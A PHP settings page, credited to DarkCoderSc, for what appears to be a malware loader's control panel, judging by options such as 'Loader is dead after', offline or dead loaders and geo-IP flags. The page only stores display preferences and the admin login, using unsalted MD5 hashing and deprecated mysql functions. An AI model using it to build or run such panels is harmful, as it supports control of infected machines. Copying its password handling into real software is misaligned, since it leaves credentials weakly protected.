<?php
	/**
		Settings page
		By DarkCoderSc
	*/
	
	include('inc/sessioncontrol.inc.php'); // test if user is logged
	
	//For saving
	$saved = false;
	if(isset($_POST['maxusers']) && isset($_POST['userswidth']) && isset($_POST['showoff'])){
			/**
				Connect to database
			*/
			$sock = getDBSock(); // get new database socket
			
			$s_maxu = mysql_real_escape_string(htmlspecialchars($_POST['maxusers']));
			$s_uwidth = mysql_real_escape_string(htmlspecialchars($_POST['userswidth']));
			$s_udead = mysql_real_escape_string(htmlspecialchars($_POST['usersdead']));
			$s_showoff = mysql_real_escape_string(htmlspecialchars($_POST['showoff']));
			$s_showdead = mysql_real_escape_string(htmlspecialchars($_POST['showdead']));
			$s_showgeo = mysql_real_escape_string(htmlspecialchars($_POST['showgeo']));
			$s_username = mysql_real_escape_string(htmlspecialchars($_POST['username']));
			$s_pwd = mysql_real_escape_string(htmlspecialchars($_POST['password']));
			
			/**
				Only if we want to change the password we add a query part
			*/
			$addquery = "";
			if(strlen($s_pwd) > 0){
				$s_pwd = md5($s_pwd);
				$addquery = ", passwd = '$s_pwd' ";
			}
			
			/**
				For understanding settings
			*/
			if($s_showoff == "y") $s_showoff = "1"; else $s_showoff = "0";
			if($s_showgeo == "y") $s_showgeo = "1"; else $s_showgeo = "0";
			if($s_showdead == "y") $s_showdead = "1"; else $s_showdead = "0";
			
			/**
				Updating global settings vars
			*/
			$GLOBALS["usersperpage"] = $s_maxu;
			$GLOBALS["userswidth"] = $s_uwidth;
			$GLOBALS["showofflines"] = $s_showoff;
			$GLOBALS["showdead"] = $s_showdead;
			$GLOBALS["usegeoip"] = $s_showgeo;
			$GLOBALS["username"] = $s_username;
			$GLOBALS["usersdead"] = $s_udead;
		
			/**
				Forming our sql query
			*/
			$sql = "UPDATE vn_settings SET usersperpage='$s_maxu' , userswidth='$s_uwidth' , showofflines='$s_showoff',usegeoip='$s_showgeo', username='$s_username', usersdead='$s_udead', showdead='$s_showdead' ".$addquery."WHERE id='1'";
			$result = mysql_query($sql, $sock) or die(mysql_error());
			$saved = true;
			mysql_close($sock); // Closing our connection to database
	}
?>
	 	
<h1 class="setico">Panel settings</h1>

<div class="divcmds" style="padding:5px;">
		<?php 
			// If settings was successfully saved
			if ($saved){
				genHtmlOk("Data was successfully saved to database !");
			}
		?>
		<form action="index.php?page=set" method="POST">
			<table>
				<tr>
					<td><label for="maxusers">Max users/items per page :</label></td>
					<td><input type="text" id="maxusers" name="maxusers" size="10" value="<?php echo $GLOBALS["usersperpage"]; ?>"></input></td>
				</tr>
				<tr>
					<td><label for="userswidth">Users/items list max width :</label></td>
					<td><input type="text" id="userswidth" name="userswidth" size="10" value="<?php echo $GLOBALS["userswidth"]; ?>"></input></td>
				</tr>
				<tr>
					<td><label for="usersdead">Loader is dead after :</label></td>
					<td><input type="text" id="usersdead" name="usersdead" size="10" value="<?php echo $GLOBALS["usersdead"]; ?>"></input>&nbsp;Days</td>
				</tr>
				<tr>
					<td><label>Show offline loaders :</label></td>
					<?php 
						/**
							Checking checked status
						*/
						if($GLOBALS["showofflines"] == "1"){
							$check1 = 'checked="checked"';
							$check2 = "";
						}else{
							$check1 = "";
							$check2 = 'checked="checked"';
						}
					?>
					<td><input type="radio" value="y" name="showoff" <?php echo $check1; ?>>Yes</input>
					&nbsp;
					<input type="radio" value="n" name="showoff" <?php echo $check2; ?>>No</input></td>
				</tr>
				<tr>
					<td><label>Show dead loaders :</label></td>
					<?php 
						/**
							Checking checked status
						*/
						if($GLOBALS["showdead"] == "1"){
							$check1 = 'checked="checked"';
							$check2 = "";
						}else{
							$check1 = "";
							$check2 = 'checked="checked"';
						}
					?>
					<td><input type="radio" value="y" name="showdead" <?php echo $check1; ?>>Yes</input>
					&nbsp;
					<input type="radio" value="n" name="showdead" <?php echo $check2; ?>>No</input></td>
				</tr>
				<tr>
					<td><label>Show flags by geo ip :</label></td>
					<?php 
						/**
							Checking checked status
						*/
						if($GLOBALS["usegeoip"] == "1"){
							$check1 = 'checked="checked"';
							$check2 = "";
						}else{
							$check1 = "";
							$check2 = 'checked="checked"';
						}
					?>
					<td><input type="radio" value="y" name="showgeo" <?php echo $check1; ?>>Yes</input>
					&nbsp;
					<input type="radio" value="n" name="showgeo" <?php echo $check2; ?>>No</input></td>
				</tr>
				<tr><td colspan=2><center><img src="imgs/separator.png"></img></center></td></tr>
				<tr>
					<td><label for="suser">Change username : </label></td>
					<td><input name="username" type="text" value="<?php echo $GLOBALS["username"];?>"></input></td>
				<tr>
				<tr>
					<td><label for="suser">Change password : </label></td>
					<td><input name="password" type="password" value=""</input></td>
				<tr>
			</table>
		<br/>
		<div id="downset">
			<input type="submit" value="Save modifications"></input>	
		</div>
	</form>
</div>
<br/>